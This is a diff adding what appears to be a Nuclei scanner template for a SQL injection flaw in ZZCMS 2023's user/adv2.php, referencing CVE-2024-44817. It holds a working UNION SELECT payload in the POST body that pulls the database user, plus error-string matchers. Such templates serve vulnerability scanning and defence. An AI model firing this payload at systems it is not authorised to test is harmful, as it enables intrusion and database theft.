@@ -1,0 +1,35 @@
+id: zzcms-2023-sqli
+
+info:
+  name: ZZCMS 2023 SQL Injection Vulnerability
+  author: GKDf1sh
+  severity: high
+  description: |
+    A SQL injection vulnerability exists in the `user/adv2.php` file of ZZCMS <= 2023. The vulnerable code at line 69 constructs a SQL query using user-supplied input without proper sanitization or parameterization. This allows an attacker to inject arbitrary SQL commands through the `id` parameter in a POST request.
+  references:
+    - http://www.zzcms.net/about/download.html
+    - http://demo.zzcms.net
+    - CVE-2024-44817
+
+tags:
+  - sqli
+  - zzcms
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/adv2.php"
+    body: "action=modify&id=0 UNION SELECT 1,2,3,4,5,6,7,8,9,0,1,user(),3,4,5,6 #"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "error"
+        part: body
+    extractors:
+      - type: regex
+        name: sql-injection
+        regex: "error in your SQL syntax"
+        group: 0
